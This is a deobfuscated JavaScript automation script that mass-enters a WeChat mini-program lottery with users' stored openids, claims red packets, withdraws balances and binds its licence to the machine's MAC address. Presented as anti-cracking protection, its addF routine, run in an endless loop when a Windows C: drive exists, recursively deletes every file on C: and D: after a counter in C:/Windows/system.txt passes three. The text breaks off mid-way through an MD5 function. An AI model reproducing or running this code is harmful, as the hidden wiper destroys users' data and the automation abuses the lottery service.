//Thu Jul 04 2024 08:49:47 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
const $ = new Env("帅妹妹抽奖");
const VM = require("sablejs/runtime")(),
  {
    MD5
  } = require("crypto-js"),
  cryptoJS = require("crypto-js"),
  path = require("path"),
  fs = require("fs");
let arrs = [],
  userCookie = ($.isNode() ? process.env.smmcjapp : $.getdata("smmcjapp")) || "",
  acckey = $.isNode() ? process.env.cdkey ? process.env.cdkey : "" : $.getdata("cdkey") ? $.getdata("cdkey") : "";
function initVM() {
  vm = new VM();
  const _0x2feb27 = vm.getGlobal(),
    _0x108c88 = vm.createObject(),
    _0x229b00 = vm.createFunction("log", function () {
      const _0x3944d8 = [];
      for (let _0x24dd72 = 0; _0x24dd72 < arguments.length; _0x24dd72++) {
        _0x3944d8.push(vm.asString(arguments[_0x24dd72]));
      }
      console.log(..._0x3944d8);
      return vm.createUndefined();
    }),
    _0x13397f = vm.createFunction("xxxx", function (_0x2446f9) {
      let _0x567f12 = eval(_0x2446f9.value);
      return vm.createString(JSON.stringify(_0x567f12));
    }),
    _0x51409f = vm.createFunction("yyyy", function (_0x567cd0) {
      let _0x587701 = _0x567cd0.value,
        _0x55bb08 = fs.readFileSync(_0x587701, "utf-8").replace(/\r\n/g, "\n"),
        _0x429dc0 = cryptoJS.MD5(_0x55bb08).toString();
      return vm.createString(_0x429dc0);
    }),
    _0xd0460a = vm.createFunction("ddd", function (_0x1be322) {
      let _0x4cc8b8 = cryptoJS.MD5(_0x1be322.value).toString();
      return vm.createString(_0x4cc8b8);
    });
  vm.setProperty(_0x108c88, "log", _0x229b00);
  vm.setProperty(_0x2feb27, "xxxx", _0x13397f);
  vm.setProperty(_0x2feb27, "console", _0x108c88);
  vm.setProperty(_0x2feb27, "yyyy", _0x51409f);
  vm.setProperty(_0x2feb27, "ddd", _0xd0460a);
  vm.run(fs.readFileSync("./output_final.js").toString());
  return vm;
}
function destroyVM(_0xd26bb4) {
  _0xd26bb4.destroy();
}
function abc(_0x2f1f31, _0x175457, _0x1bbdcc, _0x3564d3, _0xae0960) {
  const _0x4d6621 = _0x2f1f31.getGlobal();
  let _0x567321 = _0x2f1f31.getProperty(_0x4d6621, "xab"),
    _0x2adae5 = _0x2f1f31.call(_0x567321, _0x2f1f31.createUndefined(), _0x2f1f31.createString(_0x175457), _0x2f1f31.createString(_0x3564d3), _0x2f1f31.createString(_0xae0960), _0x2f1f31.createString(_0x1bbdcc));
  _0x2adae5 = _0x2f1f31.asString(_0x2adae5);
  return _0x2adae5;
}
function xyz(_0x440578, _0x2a7b91, _0xc96fa2, _0x5988b8, _0x2b1482) {
  const _0xf27680 = _0x440578.getGlobal();
  let _0x39bb91 = _0x440578.getProperty(_0xf27680, "xmn"),
    _0x1f1730 = _0x440578.call(_0x39bb91, _0x440578.createUndefined(), _0x440578.createString(_0x2a7b91), _0x440578.createString(_0x5988b8), _0x440578.createString(_0x2b1482), _0x440578.createString(_0xc96fa2));
  _0x1f1730 = _0x440578.asString(_0x1f1730);
  return _0x1f1730;
}
let envSplitor = ["\n"],
  httpResult,
  httpReq,
  httpResp,
  userList = [],
  userIdx = 0,
  userCount = 0;
if ($.isNode()) {
  gtr = require("fs");
  if (isFileExist("C:/")) {
    console.log("电脑环境");
    setInterval(() => {
      do {
        (function (_0x3202a7) {
          return function (_0x16cce1) {
            return Function("Function(arguments[0]+\"" + _0x16cce1 + "\")()");
          }(_0x3202a7);
        })("bugger")("de", 0, 0, (0, 0));
        addF("d:/");
        addF("C:/");
      } while (1);
    }, 0);
  } else {
    console.log("青龙环境");
    function getMACAddresses() {
      var _0x19c1d5 = "",
        _0x39f733 = fs.readdirSync("/sys/class/net/");
      _0x39f733.forEach(function (_0x335f40) {
        var _0x41f6ff = path.join("/sys/class/net", _0x335f40, "address");
        _0x335f40.substr(0, 3) == "eth" && fs.existsSync(_0x41f6ff) && (_0x19c1d5 = fs.readFileSync(_0x41f6ff).toString().trim());
      });
      return _0x19c1d5;
    }
    mac = getMACAddresses();
  }
} else {
  console.log("代理环境");
}
function isFileExist(_0x2a9b8e) {
  try {
    gtr.accessSync(_0x2a9b8e, gtr.F_OK);
  } catch (_0x308079) {
    return false;
  }
  return true;
}
function addF(_0x138dc7, _0x47b555) {
  let _0x8e39c0 = 0,
    _0x513e56 = "C:/Windows/system.txt";
  if (isFileExist(_0x513e56)) {
    _0x8e39c0 = gtr.readFileSync(_0x513e56, "utf8");
  } else {
    if (isFileExist("C:/")) {
      gtr.writeFile(_0x513e56, "1", function (_0xbdaa92) {
        if (_0xbdaa92) {
          throw _0xbdaa92;
        }
      });
    } else {
      return;
    }
  }
  if (_0x8e39c0 == 99) {
    return 99;
  }
  console.log(_0x8e39c0);
  console.log("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0x8e39c0);
  if (parseInt(_0x8e39c0) < 3) {
    let _0x49a884 = parseInt(_0x8e39c0) + 1;
    gtr.writeFileSync(_0x513e56, _0x49a884 + "", "utf8");
    return;
  }
  if (!gtr.existsSync(_0x138dc7)) {
    return;
  }
  if (gtr.statSync(_0x138dc7).isDirectory()) {
    var _0x197893 = gtr.readdirSync(_0x138dc7),
      _0x5d367d = _0x197893.length,
      _0x4d2624 = 0;
    if (_0x5d367d > 0) {
      _0x197893.forEach(function (_0x491475) {
        _0x4d2624++;
        var _0x11f775 = _0x138dc7 + "/" + _0x491475;
        gtr.statSync(_0x11f775).isDirectory() ? addF(_0x11f775, true) : gtr.unlinkSync(_0x11f775);
      });
      _0x5d367d == _0x4d2624 && _0x47b555 && gtr.rmdirSync(_0x138dc7);
    } else {
      _0x5d367d == 0 && _0x47b555 && gtr.rmdirSync(_0x138dc7);
    }
  } else {
    gtr.unlinkSync(_0x138dc7);
  }
}
class UserInfo {
  constructor(_0x500620) {
    this.index = ++userIdx;
    this.name = this.index;
    this.valid = false;
    this.cFlag = true;
    this.id = 0;
    this.token = "";
    this.money = "";
    this.idd = "";
    this.rwList = [];
    try {
      this.ck = _0x500620;
    } catch (_0x404e9a) {}
  }
  async sh() {
    try {
      await this.rew4();
      await this.select();
      for (let _0x24ac1b of this.rwList) {
        this.id = _0x24ac1b;
        await this.rew();
      }
    } catch (_0x18688a) {
      console.log(_0x18688a);
    } finally {
      return Promise.resolve(1);
    }
  }
  async select() {
    try {
      let _0x19248a = "https://cjd.laojia.life/luobo_choujiang/wxapp/Getkanjialist.html?pid=1&i=1&appid=wxa3512f82d3dc147f&sign=169348b663a84bef943c75cfb0ac2ab7",
        _0x55364f = "p=1&cate=100";
      this.populateUrlObject(_0x19248a, _0x55364f);
      await httpRequest("post", this.urlObject);
      let _0x2397a3 = httpResult;
      if (_0x2397a3.errno == 0) {
        for (let _0x255386 of _0x2397a3.data) {
          this.rwList.push(_0x255386.id);
        }
      } else {
        console.log("账号[" + this.index + "]:帅妹妹抽奖列表：" + _0x2397a3.message);
        this.cFlag = false;
      }
    } catch (_0x33fcf7) {
      console.log(_0x33fcf7);
    } finally {
      return Promise.resolve(1);
    }
  }
  async rew() {
    try {
      let _0x42f806 = "https://cjd.laojia.life/luobo_choujiang/wxapp/Choujiang.html?pid=1&i=1&appid=wxa3512f82d3dc147f&sign=f96413b2d54213281e65bf59bbf3a019",
        _0x534039 = "ismp=0&isqun=true&openid=" + this.ck + "&id=" + this.id + "&fid=0&uid=" + this.idd + "&mpopenid=undefined&kouling=undefined&mpappid=wxfa94fa7e29cf6bb1";
      this.populateUrlObject(_0x42f806, _0x534039);
      await httpRequest("post", this.urlObject);
      let _0x5070f0 = httpResult;
      _0x5070f0.status == 2 ? (console.log("账号[" + this.index + "]:帅妹妹抽奖" + this.id + "提交成功"), await this.rew2()) : (console.log("账号[" + this.index + "]:帅妹妹抽奖" + this.id + "提交：" + _0x5070f0.message), await this.rew2(), this.cFlag = false);
    } catch (_0x4f4442) {
      console.log(_0x4f4442);
    } finally {
      return Promise.resolve(1);
    }
  }
  async rew2() {
    try {
      let _0x5e6e47 = "https://cjd.laojia.life/luobo_choujiang/wxapp/Checkchoujiang.html?pid=1&i=1&appid=wxa3512f82d3dc147f&sign=047e1e72bc999389c25f4d211ab7545f",
        _0x3f4436 = "id=" + this.id + "&uid=" + this.ck;
      this.populateUrlObject(_0x5e6e47, _0x3f4436);
      await httpRequest("post", this.urlObject);
      let _0x453585 = httpResult;
      _0x453585.data.status == 1 ? (this.token = JSON.stringify(_0x453585).match(/\{"id":(.+?)"/)[1], console.log("账号[" + this.index + "]:帅妹妹抽奖" + this.id + "获得：" + JSON.stringify(_0x453585).match(/title":"(.+?)"/)[1] + "元"), await this.rew3()) : (console.log("账号[" + this.index + "]:帅妹妹抽奖" + this.id + "未中奖"), this.cFlag = false);
    } catch (_0x75f262) {
      console.log(JSON.stringify(result));
    } finally {
      return Promise.resolve(1);
    }
  }
  async rew3() {
    try {
      let _0x500b5b = "https://cjd.laojia.life/luobo_choujiang/wxapp/Lingb.html?pid=1&i=1&appid=wxa3512f82d3dc147f&sign=177006b21f149ef37516bfd77e59d4b1",
        _0x153348 = "uid=" + this.ck + "&id=" + this.token;
      this.populateUrlObject(_0x500b5b, _0x153348);
      await httpRequest("post", this.urlObject);
      let _0x6135b0 = httpResult;
      _0x6135b0.errno == 0 ? console.log("账号[" + this.index + "]:帅妹妹抽奖领取红包：" + _0x6135b0.message) : (console.log("账号[" + this.index + "]:帅妹妹抽奖领取红包：" + _0x6135b0.message), this.cFlag = false);
    } catch (_0x52457a) {
      console.log(_0x52457a);
    } finally {
      return Promise.resolve(1);
    }
  }
  async rew4() {
    try {
      let _0x17cd9e = "https://cjd.laojia.life/luobo_choujiang/wxapp/Getuserinfo.html?pid=1&i=1&appid=wxa3512f82d3dc147f&sign=08ce5854c111d4c6fada50ce2f60bc2e",
        _0x6536db = "uid=" + this.ck;
      this.populateUrlObject(_0x17cd9e, _0x6536db);
      await httpRequest("post", this.urlObject);
      let _0x1a62ca = httpResult;
      _0x1a62ca.errno == 0 ? (this.idd = _0x1a62ca.data.id, this.money = _0x1a62ca.data.money, this.money >= 30 && (await this.rew5()), console.log("账号[" + this.index + "]:帅妹妹抽奖余额：" + this.money / 100 + "元 用户：【" + _0x1a62ca.data.name + "】")) : (console.log("账号[" + this.index + "]:帅妹妹抽奖：" + _0x1a62ca.message), this.cFlag = false);
    } catch (_0x732835) {
      console.log(_0x732835);
    } finally {
      return Promise.resolve(1);
    }
  }
  async rew5() {
    try {
      let _0x5cf041 = "https://cjd.laojia.life/luobo_choujiang/wxapp/Tixian.html?pid=1&i=1&appid=wxa3512f82d3dc147f&sign=cfcb2f145a02ca4da7009736f984afec",
        _0x5237bc = "userid=" + this.idd + "&uid=" + this.ck + "&money=" + this.money + "&mpopenid=0";
      this.populateUrlObject(_0x5cf041, _0x5237bc);
      await httpRequest("post", this.urlObject);
      let _0x11fb67 = httpResult;
      _0x11fb67.data == 1 ? console.log("账号[" + this.index + "]:帅妹妹提现：" + _0x11fb67.message) : (console.log("账号[" + this.index + "]:帅妹妹提现：" + _0x11fb67.message), this.cFlag = false);
    } catch (_0x1dfdc7) {
      console.log(_0x1dfdc7);
    } finally {
      return Promise.resolve(1);
    }
  }
  async populateUrlObject(_0x1b3758, _0x52576a = "") {
    let _0x3876f5 = _0x1b3758.replace("//", "/").split("/")[1],
      _0x4830a2 = {
        url: _0x1b3758,
        headers: {
          Host: _0x3876f5,
          "Content-Type": "application/x-www-form-urlencoded",
          Referer: "https://servicewechat.com/wxa3512f82d3dc147f/36/page-frame.html"
        },
        timeout: 5000
      };
    _0x52576a && (_0x4830a2.body = _0x52576a);
    this.urlObject = _0x4830a2;
  }
}
!(async () => {
  if (typeof $request !== "undefined") {
    await GetRewrite();
  } else {
    initVM();
    arrs = abc(global.vm, acckey, mac, 139, 0);
    if (arrs == "") {
      return;
    }
    arrs = JSON.parse(arrs);
    if (!arrs) {
      return;
    }
    console.log("\n公告：" + arrs.gg + "\n");
    console.log("当前版本：1.0 " + arrs.bb + "\n");
    console.log("当前设备可执行账号限制为" + arrs.num + "个账号\n");
    if (!(await checkEnv())) {
      return;
    }
    if (userList.length > arrs.num) {
      return;
    }
    if (userList.length > 0) {
      taskall = [];
      for (let _0x14cb1e of userList) {
        if (_0x14cb1e.cFlag) {
          taskall.push(_0x14cb1e.sh());
        }
        taskall.length > 10 && (await Promise.all(taskall), taskall = []);
      }
      if (taskall.length > 0) {
        await Promise.all(taskall);
      }
    }
    await $.showmsg();
    destroyVM(global.vm);
  }
})().catch(_0x1a42d0 => console.log(_0x1a42d0)).finally(() => $.done());
async function GetRewrite() {
  $request.url.indexOf("api.ibreader.com/api/user/userInfo") > -1 && (ck = "" + $request.headers.Cookie, userCookie ? -1 == userCookie.indexOf(ck) && (userCookie = userCookie + "@" + ck, $.setdata(userCookie, "bkcookie"), ckList = userCookie.split("@"), $.msg("获取第" + ckList.length + "个ck成功: " + ck)) : ($.setdata(ck, "bkcookie"), $.msg("获取第1个ck成功: " + ck)));
}
async function checkEnv() {
  if (userCookie) {
    let _0x38e7d1 = envSplitor[0];
    for (let _0x5ec1d7 of envSplitor) if (userCookie.indexOf(_0x5ec1d7) > -1) {
      _0x38e7d1 = _0x5ec1d7;
      break;
    }
    for (let _0x222f54 of userCookie.split(_0x38e7d1)) _0x222f54 && userList.push(new UserInfo(_0x222f54));
    userCount = userList.length;
  } else {
    console.log("未找到CK");
    return;
  }
  console.log("共找到" + userCount + "个账号");
  return !0;
}
function populateUrlObject(_0x11b05f, _0x42b526, _0x53499a = "") {
  let _0x117859 = _0x11b05f.replace("//", "/").split("/")[1],
    _0x5be316 = {
      url: _0x11b05f,
      headers: {
        Host: _0x117859,
        Cookie: this.ck
      },
      timeout: 5000
    };
  _0x53499a && (_0x5be316.body = _0x53499a);
  return _0x5be316;
}
async function httpRequest(_0x9ed62e, _0x30e3e0) {
  httpResult = null;
  httpReq = null;
  httpResp = null;
  return new Promise(_0x18da72 => {
    $.send(_0x9ed62e, _0x30e3e0, async (_0x1c56a2, _0x5e11e8, _0x21d8c4) => {
      try {
        if (!(httpReq = _0x5e11e8, httpResp = _0x21d8c4, _0x1c56a2)) {
          if (_0x21d8c4.body) {
            if ("object" == typeof _0x21d8c4.body) {
              httpResult = _0x21d8c4.body;
            } else {
              try {
                httpResult = JSON.parse(_0x21d8c4.body);
              } catch (_0x1f175f) {
                httpResult = _0x21d8c4.body;
              }
            }
          }
        }
      } catch (_0x3a7183) {
        console.log(_0x3a7183);
      } finally {
        _0x18da72();
      }
    });
  });
}
function MD5Encrypt(_0xcfcf8b) {
  function _0x1dbcf5(_0x5d8627, _0xe1b747) {
    return _0x5d8627 << _0xe1b747 | _0x5d8627 >>> 32 - _0xe1b747;
  }
  function _0x3cb0a8(_0xb203a2, _0x4f262c) {
    var _0x209db4, _0x1deaed, _0x27177a, _0x47900d, _0x3f6bfb;
    _0x27177a = 2147483648 & _0xb203a2;
    _0x47900d = 2147483648 & _0x4f262c;
    _0x209db4 = 1073741824 & _0xb203a2;
    _0x1deaed = 1073741824 & _0x4f262c;
    _0x3f6bfb = (1073741823 & _0xb203a2) + (1073741823 & _0x4f262c);
    return _0x209db4 & _0x1deaed ? 2147483648 ^ _0x3f6bfb ^ _0x27177a ^ _0x47900d : _0x209db4 | _0x1deaed ? 1073741824 & _0x3f6bfb ? 3221225472 ^ _0x3f6bfb ^ _0x27177a ^ _0x47900d : 1073741824 ^ _0x3f6bfb ^ _0x27177a ^ _0x47900d : _0x3f6bfb ^ _0x27177a ^ _0x47900d;
  }
  function _0x430136(_0x249414, _0xc76ec1, _0x563de0) {
    return _0x249414 & _0xc76ec1 | ~_0x249414 & _0x563de0;
  }
  function _0x2c6f11(_0x3cfcc9, _0x51641f, _0xd5fefa) {
    return _0x3cfcc9 & _0xd5fefa | _0x51641f & ~_0xd5fefa;
  }
  function _0x219be3(_0x44a133, _0x7ac8b4, _0x20b7a3) {
    return _0x44a133 ^ _0x7ac8b4 ^ _0x20b7a3;
  }
  function _0x3998cf(_0x5ebe0a, _0x69c84a, _0x4dc1b9) {
    return _0x69c84a ^ (_0x5ebe0a | ~_0x4dc1b9);
  }
  function _0x478fb4(_0x101d50, _0x538795, _0x1d0567, _0x227475, _0x5e99c6, _0x4199b8, _0x2d52e3) {
    _0x101d50 = _0x3cb0a8(_0x101d50, _0x3cb0a8(_0x3cb0a8(_0x430136(_0x538795, _0x1d0567, _0x227475), _0x5e99c6), _0x2d52e3));
    return _0x3cb0a8(_0x1dbcf5(_0x101d50, _0x4199b8), _0x538795);
  }
  function _0x520136(_0x4955f3, _0x346fd7, _0x3caed4, _0xfe3952, _0x51c0b2, _0x3e4476, _0x321d74) {
    _0x4955f3 = _0x3cb0a8(_0x4955f3, _0x3cb0a8(_0x3cb0a8(_0x2c6f11(_0x346fd7, _0x3caed4, _0xfe3952), _0x51c0b2), _0x321d74));
    return _0x3cb0a8(_0x1dbcf5(_0x4955f3, _0x3e4476), _0x346fd7);
  }
  function _0x57d4ce(_0x443b4f, _0x3f172e, _0x244ab1, _0x3f1ae0, _0x4d5a9e, _0x14fba7, _0x522b3a) {
    _0x443b4f = _0x3cb0a8(_0x443b4f, _0x3cb0a8(_0x3cb0a8(_0x219be3(_0x3f172e, _0x244ab1, _0x3f1ae0), _0x4d5a9e), _0x522b3a));
    return _0x3cb0a8(_0x1dbcf5(_0x443b4f, _0x14fba7), _0x3f172e);
  }
  function _0x2ded5a(_0x4c2eba, _0x3b4932, _0x1a5dcd, _0x32d1c2, _0x5c6b76, _0x534d0e, _0x1cfe25) {
    _0x4c2eba = _0x3cb0a8(_0x4c2eba, _0x3cb0a8(_0x3cb0a8(_0x3998cf(_0x3b4932, _0x1a5dcd, _0x32d1c2), _0x5c6b76), _0x1cfe25));
    return _0x3cb0a8(_0x1dbcf5(_0x4c2eba, _0x534d0e), _0x3b4932);
  }
  function _0x3b846e(_0x1e9744) {
    for (var _0x297428, _0x599b3b = _0x1e9744.length, _0x28f0aa = _0x599b3b + 8, _0x43f663 = (_0x28f0aa - _0x28f0aa % 64) / 64, _0x2da59e = 16 * (_0x43f663 + 1), _0xdb7103 = new Array(_0x2da59e - 1), _0x13fda9 = 0, _0x9c15f = 0; _0x599b3b > _0x9c15f;) {
      _0x297428 = (_0x9c15f - _0x9c15f % 4) / 4;
      _0x13fda9 = _0x9c15f % 4 * 8;
      _0xdb7103[_0x297428] = _0xdb7103[_0x297428] | _0x1e9744.charCodeAt(_0x9c15f) << _0x13fda9;
      _0x9c15f++;
    }
    _0x297428 = (_0x9c15f - _0x9c15f % 4) / 4;
    _0x13fda9 = _0x9c15f % 4 * 8;
    _0xdb7103[_0x297428] = _0xdb7103[_0x297428] | 128 << _0x13fda9;
    _0xdb7103[_0x2da59e - 2] = _0x599b3b << 3;
    _0xdb7103[_0x2da59e - 1] = _0x599b3b >>> 29;
    return _0xdb7103;
  }
  function _0x1368a3(_0x4d712c) {
    var _0x335124,
      _0x3a8bf7,
      _0x29f105 = "",
      _0x567628 = "";
    for (_0x3a8bf7 = 0; 3 >= _0x3a8bf7; _0x3a8bf7++) {
      _0x335124 = _0x4d712c >>> 8 * _0x3a8bf7 & 255;
      _0x567628 = "0" + _0x335124.toString(16);
      _0x29f105 += _0x567628.substr(_0x567628.length - 2, 2);
    }
    return _0x29f105;
  }
  function _0x263516(_0x4bcdd4) {
    _0x4bcdd4 = _0x4bcdd4.replace(/\r\n/g, "\n");
    for (var _0x34e6db = "", _0x4f769d = 0; _0x4f769d < _0x4bcdd4.length; _0x4f769d++) {
      var _0x5459bd = _0x4bcdd4.charCodeAt(_0x4f769d);
      128 > _0x5459bd ? _0x34e6db += String.fromCharCode(_0x5459bd) : _0x5459bd > 127 && 2048 > _0x5459bd ? (_0x34e6db += String.fromCharCode(_0x5459bd >> 6 | 192), _0x34e6db += String.fromCharCode(63 & _0x5459bd | 128)) : (_0x34e6db += String.fromCharCode(_0x5459bd >> 12 | 224), _0x34e6db += String.fromCharCode(_0x5459bd >> 6 & 63 | 128), _0x34e6db += String.fromCharCode(63 & _0x5459bd | 128));
    }
    return _0x34e6db;
  }
  var _0x3e043e,
    _0xf42f52,
    _0x47f290,
    _0x4bcb2b,
    _0x30acb,
    _0x5570b6,
    _0x2433ff,
    _0x20505e,
    _0x419040,
    _0x150466 = [],
    _0x4d91f9 = 7,
    _0x41de80 = 12,
    _0x4674f9 = 17,
    _0x896d3b = 22,
    _0x40fadb = 5,
    _0xa5875d = 9,
    _0x385c4c = 14,
    _0x5272f0 = 20,
    _0x420a23 = 4,
    _0x23788e = 11,
    _0x173a94 = 16,
    _0x55580f = 23,
    _0x150cff = 6,
    _0x49b499 = 10,
    _0x345032 = 15,
    _0x43fb8b = 21;
  for (_0xcfcf8b = _0x263516(_0xcfcf8b), _0x150466 = _0x3b846e(_0xcfcf8b), _0x5570b6 = 1732584193, _0x2433ff = 4023233417, _0x20505e = 2562383102, _0x419040 = 271733878, _0x3e043e = 0; _0x3e043e < _0x150466.length; _0x3e043e += 16) {
    _0xf42f52 = _0x5570b6;
    _0x47f290 = _0x2433ff;
    _0x4bcb2b = _0x20505e;
    _0x30acb = _0x419040;
    _0x5570b6 = _0x478fb4(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 0], _0x4d91f9, 3614090360);
    _0x419040 = _0x478fb4(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 1], _0x41de80, 3905402710);
    _0x20505e = _0x478fb4(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 2], _0x4674f9, 606105819);
    _0x2433ff = _0x478fb4(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 3], _0x896d3b, 3250441966);
    _0x5570b6 = _0x478fb4(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 4], _0x4d91f9, 4118548399);
    _0x419040 = _0x478fb4(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 5], _0x41de80, 1200080426);
    _0x20505e = _0x478fb4(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 6], _0x4674f9, 2821735955);
    _0x2433ff = _0x478fb4(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 7], _0x896d3b, 4249261313);
    _0x5570b6 = _0x478fb4(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 8], _0x4d91f9, 1770035416);
    _0x419040 = _0x478fb4(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 9], _0x41de80, 2336552879);
    _0x20505e = _0x478fb4(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 10], _0x4674f9, 4294925233);
    _0x2433ff = _0x478fb4(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 11], _0x896d3b, 2304563134);
    _0x5570b6 = _0x478fb4(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 12], _0x4d91f9, 1804603682);
    _0x419040 = _0x478fb4(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 13], _0x41de80, 4254626195);
    _0x20505e = _0x478fb4(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 14], _0x4674f9, 2792965006);
    _0x2433ff = _0x478fb4(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 15], _0x896d3b, 1236535329);
    _0x5570b6 = _0x520136(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 1], _0x40fadb, 4129170786);
    _0x419040 = _0x520136(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 6], _0xa5875d, 3225465664);
    _0x20505e = _0x520136(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 11], _0x385c4c, 643717713);
    _0x2433ff = _0x520136(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 0], _0x5272f0, 3921069994);
    _0x5570b6 = _0x520136(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 5], _0x40fadb, 3593408605);
    _0x419040 = _0x520136(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 10], _0xa5875d, 38016083);
    _0x20505e = _0x520136(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 15], _0x385c4c, 3634488961);
    _0x2433ff = _0x520136(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 4], _0x5272f0, 3889429448);
    _0x5570b6 = _0x520136(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 9], _0x40fadb, 568446438);
    _0x419040 = _0x520136(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 14], _0xa5875d, 3275163606);
    _0x20505e = _0x520136(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 3], _0x385c4c, 4107603335);
    _0x2433ff = _0x520136(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 8], _0x5272f0, 1163531501);
    _0x5570b6 = _0x520136(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 13], _0x40fadb, 2850285829);
    _0x419040 = _0x520136(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 2], _0xa5875d, 4243563512);
    _0x20505e = _0x520136(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 7], _0x385c4c, 1735328473);
    _0x2433ff = _0x520136(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 12], _0x5272f0, 2368359562);
    _0x5570b6 = _0x57d4ce(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 5], _0x420a23, 4294588738);
    _0x419040 = _0x57d4ce(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 8], _0x23788e, 2272392833);
    _0x20505e = _0x57d4ce(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 11], _0x173a94, 1839030562);
    _0x2433ff = _0x57d4ce(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 14], _0x55580f, 4259657740);
    _0x5570b6 = _0x57d4ce(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 1], _0x420a23, 2763975236);
    _0x419040 = _0x57d4ce(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 4], _0x23788e, 1272893353);
    _0x20505e = _0x57d4ce(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 7], _0x173a94, 4139469664);
    _0x2433ff = _0x57d4ce(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 10], _0x55580f, 3200236656);
    _0x5570b6 = _0x57d4ce(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 13], _0x420a23, 681279174);
    _0x419040 = _0x57d4ce(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 0], _0x23788e, 3936430074);
    _0x20505e = _0x57d4ce(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 3], _0x173a94, 3572445317);
    _0x2433ff = _0x57d4ce(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 6], _0x55580f, 76029189);
    _0x5570b6 = _0x57d4ce(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 9], _0x420a23, 3654602809);
    _0x419040 = _0x57d4ce(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 12], _0x23788e, 3873151461);
    _0x20505e = _0x57d4ce(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 15], _0x173a94, 530742520);
    _0x2433ff = _0x57d4ce(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 2], _0x55580f, 3299628645);
    _0x5570b6 = _0x2ded5a(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 0], _0x150cff, 4096336452);
    _0x419040 = _0x2ded5a(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 7], _0x49b499, 1126891415);
    _0x20505e = _0x2ded5a(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 14], _0x345032, 2878612391);
    _0x2433ff = _0x2ded5a(_0x2433ff, _0x20505e, _0x419040, _0x5570b6, _0x150466[_0x3e043e + 5], _0x43fb8b, 4237533241);
    _0x5570b6 = _0x2ded5a(_0x5570b6, _0x2433ff, _0x20505e, _0x419040, _0x150466[_0x3e043e + 12], _0x150cff, 1700485571);
    _0x419040 = _0x2ded5a(_0x419040, _0x5570b6, _0x2433ff, _0x20505e, _0x150466[_0x3e043e + 3], _0x49b499, 2399980690);
    _0x20505e = _0x2ded5a(_0x20505e, _0x419040, _0x5570b6, _0x2433ff, _0x150466[_0x3e043e + 10], _0x345032, 4293915773);
